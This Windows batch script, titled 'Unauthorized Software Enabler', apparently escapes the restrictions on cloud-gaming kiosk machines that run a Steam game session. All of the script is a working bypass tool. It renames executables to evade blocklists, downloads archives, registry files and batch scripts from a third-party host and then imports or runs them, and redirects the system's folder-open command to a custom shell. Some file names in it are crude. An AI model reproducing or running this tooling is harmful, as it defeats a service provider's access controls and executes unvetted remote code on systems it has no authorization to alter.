@ECHO OFF
color 47
if exist "C:\Program Files (x86)\Steam\steamapps\common\Assassins Creed Origins\7za.exe" ( 
 GOTO FirstTimeCheck
) else (
 GOTO SteamSession
)

:FirstTimeCheck:
if exist "C:\Program Files (x86)\Steam\music\_database\wget.db" ( 
 GOTO NotSteamSession
) else (
 GOTO FirstTime
)

:FirstTime
cd "C:\Program Files (x86)\Steam"
ren wget-*-win64.zip wget.zip
if not errorlevel 1 goto SaveWgetFile
cls
echo The required WGET ZIP file was not found!
echo Please make sure that you have downloaded the WGET ZIP file from the source eternallybored.org
echo If this is the case and you still see the error message, please contact me on Discord [SoftwareRat#8089]
pause
exit

:SaveWgetFile:
copy "C:\Program Files (x86)\Steam\wget.zip" "C:\Program Files (x86)\Steam\music\_database\wget.db"
GOTO NotSteamSession

:SteamSession
cls
echo You tried to start USE without Assassins Creed Origins!
echo This dont work!
echo Please start the STEAM Version of Assassins Creed Origins!
echo If this is the case and you still see the error message, please contact me on Discord [SoftwareRat#8089]
pause
exit

:NotSteamSession:
cls
cd "C:\Program Files (x86)\Steam\"
ren "C:\Program Files (x86)\Steam\steamapps\common\Assassins Creed Origins\7za.exe" "8za.exe"
"C:\Program Files (x86)\Steam\steamapps\common\Assassins Creed Origins\8za.exe" x "C:\Program Files (x86)\Steam\music\_database\wget.db"
B:
md DontSaveHereDirectly
cd DontSaveHereDirectly
%HOMEDRIVE%
cd %HOMEPATH%
cd %localappdata%
md MEGAsync
md Downloads
md 8-Zip
md Notepad++
md Expsoska
md ProcessExplorer
cd "\Program Files (x86)\Steam"
title Unauthorized Software Enabler by SoftwareRat - Version 3.0
color 47
cls
echo 7-Zip will be installed...
cd %localappdata%\8-Zip
"C:\Program Files (x86)\Steam\wget.exe" http://downloads.softwarerat.de/8z/7-zip.dll
"C:\Program Files (x86)\Steam\wget.exe" http://downloads.softwarerat.de/8z/7-zip32.dll
"C:\Program Files (x86)\Steam\wget.exe" http://downloads.softwarerat.de/8z/7z.dll
"C:\Program Files (x86)\Steam\wget.exe" http://downloads.softwarerat.de/8z/8zFM.exe
"C:\Program Files (x86)\Steam\wget.exe" http://downloads.softwarerat.de/8z/8zG.exe
"C:\Program Files (x86)\Steam\wget.exe" http://downloads.softwarerat.de/8z/8z.exe
color 47
echo 7-Zip installed!
cd "\Program Files (x86)\Steam"
cls
color 47
:FIREFOX:
"C:\Program Files (x86)\Steam\wget.exe" "https://download.mozilla.org/?product=firefox-latest-ssl&os=win64&lang=en-US"
ren "index.html@product=firefox-latest-ssl&os=win64&lang=en-US" icefoxsetup.exe
cls
echo Firefox will be installed...
icefoxsetup.exe /InstallDirectoryPath=%localappdata%\Firefox
ren %localappdata%\Firefox\firefox.exe icefox.exe
color 47
cls
echo Firefox installed!
del icefox.exe
color 47
cls
:ChangeDownload:
echo Change some things for WinXShell
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /f /v {374DE290-123F-4565-9164-39C4925E467B} /t REG_EXPAND_SZ /d C:\Users\kiosk\AppData\Local\Downloads
REG ADD "HKEY_CLASSES_ROOT\Folder\shell\open\command" /f /ve /t REG_EXPAND_SZ /d C:\users\kiosk\AppData\Local\Taskbar\bin\shell\dora.exe
:Notepad:
cd %localappdata%\Notepad++
"C:\Program Files (x86)\Steam\wget.exe" https://github.com/notepad-plus-plus/notepad-plus-plus/releases/download/v7.8.7/npp.7.8.7.bin.x64.7z
%localappdata%\8-Zip\8z.exe x npp.7.8.7.bin.x64.7z
ren notepad++.exe noteblyat++.exe
del npp.7.8.6.bin.x64.7z
cd "\Program Files (x86)\Steam"
:Taskmanager:
cd %localappdata%\ProcessExplorer
"C:\Program Files (x86)\Steam\wget.exe" https://download.sysinternals.com/files/ProcessExplorer.zip
%localappdata%\8-Zip\8z.exe e ProcessExplorer.zip
del ProcessExplorer.zip
:qBittorrent:
cd %localappdata%
"C:\Program Files (x86)\Steam\wget.exe" http://downloads.softwarerat.de/AATC.7z
%localappdata%\8-Zip\8z.exe x AATC.7z
del AATC.7z
:MEGAsync:
cd %localappdata%\MEGAsync
"C:\Program Files (x86)\Steam\wget.exe" mega.nz/MEGAsyncSetup.exe
%localappdata%\8-Zip\8z.exe x %localappdata%\MEGAsync\MEGAsyncSetup.exe -x!$R0
del MEGAsyncSetup.exe
:Expsoska:
cd %localappdata%\Expsoska
"C:\Program Files (x86)\Steam\wget.exe" https://github.com/derceg/explorerplusplus/releases/download/version-1.4.0-beta/explorerpp_x64.zip
%localappdata%\8-Zip\8z.exe e explorerpp_x64.zip
:ChangeAssoc:
cd %HOMEPATH%
md FileAssoc
cd FileAssoc
"C:\Program Files (x86)\Steam\wget.exe" http://downloads.softwarerat.de/ChangeFileAssoc.7z
%localappdata%\8-Zip\8z.exe e ChangeFileAssoc.7z
reg import 7z1.reg
reg import 7z2.reg
reg import 0011.reg
reg import 0012.reg
reg import HTTP.reg
reg import HTTPS.reg
reg import ISO1.reg
reg import ISO2.reg
reg import RAR1.reg
reg import RAR2.reg
reg import TXT.reg
reg import ZIP1.reg
reg import ZIP2.reg
cd ..
rmdir /q /s FileAssoc
:Taskbar:
cd %localappdata%
"C:\Program Files (x86)\Steam\wget.exe" https://downloads.softwarerat.de/gfnx_tmgay/Taskbar.7z
cls
echo Shell will be installed...
%localappdata%\8-Zip\8z.exe x %localappdata%\Taskbar.7z
cd Taskbar
start start.bat
cls
echo Shell installed!
del %localappdata%\Taskbar.7z
cd %HOMEPATH%
"C:\Program Files (x86)\Steam\wget.exe" http://downloads.softwarerat.de/RestoreFirefoxData.bat
"C:\Program Files (x86)\Steam\wget.exe" http://downloads.softwarerat.de/SaveFirefoxData.bat
"C:\Program Files (x86)\Steam\wget.exe" http://downloads.softwarerat.de/SaveLocation.bat
"C:\Program Files (x86)\Steam\wget.exe" http://downloads.softwarerat.de/RestartWinXShell.bat
"C:\Program Files (x86)\Steam\wget.exe" http://downloads.softwarerat.de/OpenFolderWithWinXShell.bat

if exist "C:\Program Files (x86)\Steam\music\_database\fire.db" ( 
 start RestoreFirefoxData.bat
) else (
 start %localappdata%\Firefox\icefox.exe
)
if exist "C:\Program Files (x86)\Steam\music\_database\savefolder.db" ( 
 GOTO RestoreLocation
) else (
 GOTO NoSaves
)

:RestoreLocation:
echo Save detected! Files will be restored...
B:
copy "C:\Program Files (x86)\Steam\music\_database\savefolder.db"
%localappdata%\WinRAR\nvidiaraper.exe x savefolder.db
exit

:NoSaves:
echo No Saves detected! Making a new folder...
B:
md SaveHere
cd SaveHere
"C:\Program Files (x86)\Steam\wget.exe" http://downloads.softwarerat.de/readme.html
exit